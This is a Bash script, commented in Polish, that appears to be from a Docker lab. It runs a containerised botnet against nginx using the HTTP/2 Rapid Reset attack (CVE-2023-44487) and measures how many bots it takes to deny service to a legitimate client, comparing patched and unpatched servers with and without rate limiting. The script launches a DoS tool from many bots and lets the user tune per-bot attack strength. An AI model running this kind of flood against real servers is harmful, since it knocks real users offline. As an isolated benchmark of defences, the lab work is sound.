#!/usr/bin/env bash
# =============================================================================
# Botnet vs nginx — matryca "ILE BOTÓW TRZEBA" (CVE-2023-44487 HTTP/2 Rapid Reset)
# =============================================================================
# Pyta o rzecz, która ma wartość: ILE BOTÓW / JAKI AGREGATOWY RPS trzeba, żeby
# serwer przestał obsługiwać PRAWDZIWYCH użytkowników. Dla każdej pary
# (konfiguracja serwera × rozmiar botnetu) mierzy JEDNOCZEŚNIE trzy rzeczy:
#
#   [A] SIŁA OGNIA ATAKUJĄCEGO — zagregowany RST_STREAM/s i HEADERS/s z całej
#       floty (ile "strumieni na sekundę" generuje N botów).
#   [B] WPŁYW NA OFIARĘ        — CPU% ofiary + liczba aktywnych połączeń.
#   [C] DOSTĘPNOŚĆ DLA USERA   — równoległa sonda legalnego klienta (h2load, 2
#       połączenia): ile żądań 2xx się udaje, ile req/s, ile błędów.
#       SPADEK [C] = atak skuteczny. To jest "próg", którego szukamy.
#
# 4 konfiguracje serwera-ofiary:
#     old/normal   — nienałatany nginx 1.25.1, bez hardeningu
#     old/hardened — nienałatany nginx 1.25.1 + rate-limiting per-IP
#     new/normal   — załatany nginx 1.27,   bez hardeningu   (łatka Rapid Reset)
#     new/hardened — załatany nginx 1.27   + rate-limiting per-IP
# Każdy bot = osobny kontener = OSOBNE IP (prawdziwy ruch rozproszony).
#
# WYMAGANIA (uruchom najpierw w katalogu repo):
#     docker compose up -d --build        # sieć labnet + loadgen(h2load) + obraz bota
#
# PARAMETRY (zmienne środowiskowe):
#     SIZES="1 5 10 20 30"  rozmiary botnetu do przejścia
#     BOT_CPUS=1.0   limit CPU na bota   (mocny PC: 1.0+; słaby: 0.4)
#     VIC_CPUS=2.0   limit CPU ofiary    (ile rdzeni może zająć serwer)
#     CONC=800       strumieni na jedno uderzenie bota (siła na bota)
#     OUTDIR=...     gdzie zapisać wyniki (domyślnie lab-results/data)
#
# UWAGA PAMIĘĆ: 30 botów + ofiara + loadgen to ~32 kontenery. Wymaga mocnej
#   maszyny (rdzenie + RAM). Na 4-rdzeniowym/8GB hoście użyj SIZES="1 2 3".
#
# Przykład (mocny PC): SIZES="1 5 10 20 30" BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 \
#                      bash lab-results/scripts/run-botnet-matrix.sh
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true   # Git Bash na Windows: nie psuj ścieżek

HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"               # katalog repo
OUTDIR="${OUTDIR:-$HERE/../data}"; mkdir -p "$OUTDIR"
CSV="$OUTDIR/botnet.csv"; TL="$OUTDIR/botnet_timeline.txt"

NETWORK="${NETWORK:-ddos-lab_labnet}"
BOT_IMAGE="${BOT_IMAGE:-ddos-lab-bot}"          # obraz bota zbudowany przez compose
LOADGEN="${LOADGEN:-lab-loadgen}"               # kontener z h2load + curl
BOT_CPUS="${BOT_CPUS:-1.0}"; VIC_CPUS="${VIC_CPUS:-2.0}"
CONC="${CONC:-800}"; REQ="${REQ:-20000}"
SIZES="${SIZES:-1 5 10 20 30}"
WARM=3; WIN=5; NWIN=3; GAP=5
LEGWIN=$((WIN*NWIN))                             # okno sondy legalnego klienta
DUR=$((WARM + LEGWIN + 4))                       # jak długo leci atak (obejmuje sondę)
NMAX=0; for s in $SIZES; do [ "$s" -gt "$NMAX" ] && NMAX=$s; done

log(){ echo "$(date '+%H:%M:%S') | $*" | tee -a "$TL"; }
cpu_usec(){ timeout 6 docker exec lab-victim2 sh -c 'awk "/usage_usec/{print \$2}" /sys/fs/cgroup/cpu.stat' 2>/dev/null; }
active(){ timeout 6 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 4 https://victim/status 2>/dev/null' | awk '/Active/{print $3}'; }

# --- atak: każdy bot w pętli do deadline, KAŻDĄ rundę loguje summary do /tmp/rr.log ---
storm(){ local n=$1 dur=$2 b
  for b in $(seq 1 $n); do
    docker exec -d lab-bot$b sh -c 'rm -f /tmp/rr.log; end=$(( $(date +%s)+'"$dur"' )); while [ $(date +%s) -lt $end ]; do rapidreset -url https://victim:443 -requests '"$REQ"' -concurrency '"$CONC"' >> /tmp/rr.log 2>&1; done' 2>/dev/null
  done; }
stopb(){ local n=$1 b; for b in $(seq 1 $n); do docker exec lab-bot$b pkill rapidreset 2>/dev/null; done; }
# zsumuj RST_STREAM (lub HEADERS) ze wszystkich rund bota.
# Format podsumowania rapidreset: "Frames sent: HEADERS = 1575, RST_STREAM = 19671"
botsum(){ local b=$1 key=$2; timeout 6 docker exec lab-bot$b sh -c "awk -F'$key = ' 'NF>1{n=\$2; gsub(/[^0-9].*/,\"\",n); s+=n} END{print s+0}' /tmp/rr.log 2>/dev/null"; }

# --- 0. sanity: sieć istnieje? ---
docker network inspect "$NETWORK" >/dev/null 2>&1 || { echo "BŁĄD: brak sieci $NETWORK — uruchom najpierw: docker compose up -d --build"; exit 1; }

# --- 1. obrazy ofiary (stary/nowy nginx, obie konfiguracje w środku) ---
log "build labvic:old (nginx 1.25.1) + labvic:new (nginx 1.27)"
docker build -q -f "$ROOT/victim/Dockerfile.labvic" --build-arg BASE=nginx:1.25.1-alpine -t labvic:old "$ROOT/victim" >/dev/null
docker build -q -f "$ROOT/victim/Dockerfile.labvic" --build-arg BASE=nginx:1.27-alpine    -t labvic:new "$ROOT/victim" >/dev/null

# --- 2. flota botów (osobne IP, limit CPU) ---
log "flota $NMAX botów (cap ${BOT_CPUS} CPU/bot) na sieci $NETWORK"
for i in $(seq 1 $NMAX); do
  docker rm -f lab-bot$i >/dev/null 2>&1
  docker run -d --name lab-bot$i --cpus="$BOT_CPUS" --network "$NETWORK" "$BOT_IMAGE" >/dev/null
done

# CSV: pełny obraz "ile botów trzeba"
# legit_ok/legit_tot = ile z 12 sekwencyjnych zadan legalnego usera sie udalo; legit_avg_s = sr. latencja [s]
echo "config,ver,hard,size,cpu_pct,active,atk_rst_s,atk_hdr_s,legit_ok,legit_tot,legit_avg_s,legit_ok_pct" > "$CSV"

run_config(){ # ver mode
  local VER=$1 MODE=$2 IMG="labvic:$1" N w u0 u1 t0 t1 cw sum k acc cpu i b
  docker rm -f lab-victim2 >/dev/null 2>&1
  docker run -d --name lab-victim2 --network "$NETWORK" --network-alias victim --cpus="$VIC_CPUS" -e MODE=$MODE "$IMG" >/dev/null
  log "=== CONFIG $VER/$MODE ==="
  i=0; while [ $i -lt 20 ]; do timeout 4 docker exec "$LOADGEN" sh -c 'curl -sk --max-time 3 https://victim/status >/dev/null 2>&1' && break; i=$((i+1)); sleep 1; done

  for N in $SIZES; do
    storm $N $DUR; sleep $WARM
    # sonda legalnego usera: 12 sekwencyjnych zadan co ~1s, RÓWNOLEGLE z atakiem.
    # Lagodna (1 req/s) -> NIE wpada w rate-limiter; mierzy wplyw ATAKU: dostepnosc + latencje.
    docker exec -d "$LOADGEN" sh -c '
      : > /tmp/legit_lat; ok=0; tot=0
      for i in $(seq 1 12); do
        r=$(curl -sk -o /dev/null -w "%{http_code} %{time_total}" --max-time 5 https://victim/ 2>/dev/null)
        tot=$((tot+1)); set -- $r; code=$1; lat=$2; echo "$lat" >> /tmp/legit_lat
        case "$code" in 2*) ok=$((ok+1));; esac
        sleep 1
      done
      avg=$(awk "{s+=\$1;n++} END{if(n>0)printf \"%.3f\",s/n; else print 0}" /tmp/legit_lat)
      echo "ok=$ok tot=$tot avg=$avg" > /tmp/legit.out
    '
    # pomiar CPU w NWIN oknach
    sum=0; k=0; acc=0
    for w in $(seq 1 $NWIN); do
      u0=$(cpu_usec); t0=$(date +%s%N); sleep $WIN; u1=$(cpu_usec); t1=$(date +%s%N)
      [ $w -eq 2 ] && acc=$(active)
      if [ -n "$u0" ] && [ -n "$u1" ]; then cw=$(awk "BEGIN{printf \"%.2f\",($u1-$u0)/(($t1-$t0)/1000)*100}"); sum=$(awk "BEGIN{print $sum+$cw}"); k=$((k+1)); fi
    done
    sleep 2                                       # pozwól sondzie się domknąć
    stopb $N
    cpu=$(awk "BEGIN{if($k>0)printf \"%.1f\",$sum/$k; else print \"NA\"}")

    # [A] siła ognia atakującego: suma po flocie / czas trwania ataku
    trst=0; thdr=0
    for b in $(seq 1 $N); do
      vr=$(botsum $b RST_STREAM); vr=$(echo "$vr" | tr -dc '0-9'); trst=$(( trst + ${vr:-0} ))
      vh=$(botsum $b HEADERS);    vh=$(echo "$vh" | tr -dc '0-9'); thdr=$(( thdr + ${vh:-0} ))
    done
    rst_s=$(awk "BEGIN{printf \"%.0f\", $trst/$DUR}")
    hdr_s=$(awk "BEGIN{printf \"%.0f\", $thdr/$DUR}")

    # [C] dostępność + latencja legalnego usera (podczas ataku)
    LG=$(timeout 6 docker exec "$LOADGEN" sh -c 'cat /tmp/legit.out 2>/dev/null')
    lok=$(echo "$LG"  | sed -n 's/.*ok=\([0-9]*\).*/\1/p')
    ltot=$(echo "$LG" | sed -n 's/.*tot=\([0-9]*\).*/\1/p')
    lavg=$(echo "$LG" | sed -n 's/.*avg=\([0-9.]*\).*/\1/p')
    okpct=$(awk "BEGIN{if(\"$ltot\"+0>0) printf \"%.0f\",(\"$lok\"+0)/(\"$ltot\"+0)*100; else print \"NA\"}")

    echo "$VER/$MODE,$VER,$MODE,$N,$cpu,${acc:-0},$rst_s,$hdr_s,${lok:-0},${ltot:-0},${lavg:-0},$okpct" >> "$CSV"
    log "size=$N -> CPU=${cpu}% active=${acc:-0} | atak: ${rst_s} RST/s, ${hdr_s} HEADERS/s | legalny user: ${lok:-0}/${ltot:-0} OK (${okpct}%), avg ${lavg:-0}s"
    sleep $GAP
  done
}

# CONFIGS pozwala zawęzić zestaw (np. CONFIGS="old/normal" do eskalacji na podatnej konfiguracji)
CONFIGS="${CONFIGS:-old/normal old/hardened new/normal new/hardened}"
for c in $CONFIGS; do run_config "${c%/*}" "${c#*/}"; done

log "MATRYCA GOTOWA -> $CSV"
echo; echo "=== WYNIK: ile botów trzeba (CPU ofiary / siła ataku / dostępność usera) ==="
awk -F, 'NR==1{next}
  {printf "%-14s size=%-3s  CPU=%6s%%  atak=%11s RST/s  user=%2s/%2s OK (%3s%%)  avg=%5ss\n",$1,$4,$5,$7,$9,$10,$12,$11}' "$CSV"

# sprzątanie floty/ofiary (zostaw bazowy lab)
for i in $(seq 1 $NMAX); do docker rm -f lab-bot$i >/dev/null 2>&1; done
docker rm -f lab-victim2 >/dev/null 2>&1
log "sprzątnięto flotę i lab-victim2"
